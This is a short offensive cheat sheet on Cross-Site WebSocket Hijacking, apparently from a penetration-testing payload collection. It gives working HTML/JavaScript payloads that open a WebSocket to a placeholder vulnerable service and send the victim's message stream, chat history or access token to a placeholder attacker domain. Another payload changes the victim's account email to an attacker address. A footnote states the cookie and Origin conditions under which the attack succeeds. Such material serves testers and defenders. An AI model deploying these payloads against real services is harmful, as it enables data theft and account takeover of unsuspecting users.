# Cross-Site WebSocket Hijacking

## Table of Contents
- [Data Exfiltration](#data-exfiltration)
- [Account Takeover](#account-takeover)
- [Data Tampering](#data-tampering)

## Data Exfiltration

### The connection is bidirectional, so unlike a forged HTTP request the attacker reads everything the service sends to the victim. [^1]

- Recording the victim's message stream
    ```html
    <script>
        const ws = new WebSocket('wss://[VULNERABLE-SERVICE]/chat');

        ws.onmessage = (event) => {
            fetch('https://[ATTACKER-DOMAIN]/', {
                method: 'POST',
                body: event.data
            });
        };
    </script>
    ```

- Requesting the victim's history
    ```html
    <script>
        const ws = new WebSocket('wss://[VULNERABLE-SERVICE]/chat');

        ws.onopen = () => {
            ws.send(JSON.stringify({ action: 'history', count: 1000 }));
        };

        ws.onmessage = (event) => {
            fetch('https://[ATTACKER-DOMAIN]/', {
                method: 'POST',
                body: event.data
            });
        };
    </script>
    ```

## Account Takeover

### Credentials that the service delivers over the socket are readable by the attacker. [^1]

- Capturing a token issued on connect
    ```html
    <script>
        const ws = new WebSocket('wss://[VULNERABLE-SERVICE]/socket');

        ws.onmessage = (event) => {
            const msg = JSON.parse(event.data);

            if (msg.type === 'session') {
                fetch(`https://[ATTACKER-DOMAIN]/?token=${msg.access_token}`);
            }
        };
    </script>
    ```

## Data Tampering

### Actions can be performed as the victim, and their outcome is visible to the attacker rather than blind. [^1]

- Changing the victim's account settings
    ```html
    <script>
        const ws = new WebSocket('wss://[VULNERABLE-SERVICE]/socket');

        ws.onopen = () => {
            ws.send(JSON.stringify({ action: 'updateEmail', email: 'attacker@[ATTACKER-DOMAIN]' }));
        };

        ws.onmessage = (event) => {
            // The result of the action is returned on the same connection
            fetch('https://[ATTACKER-DOMAIN]/', {
                method: 'POST',
                body: event.data
            });
        };
    </script>
    ```

[^1]: Applies when the handshake's `Origin` header is not validated and the session cookie is set with `SameSite=None`. Under the `SameSite=Lax` default the cookie is not attached to a cross-site handshake, so the connection is not authenticated. A page on the service's own site, such as a subdomain the attacker controls, is not subject to that restriction.
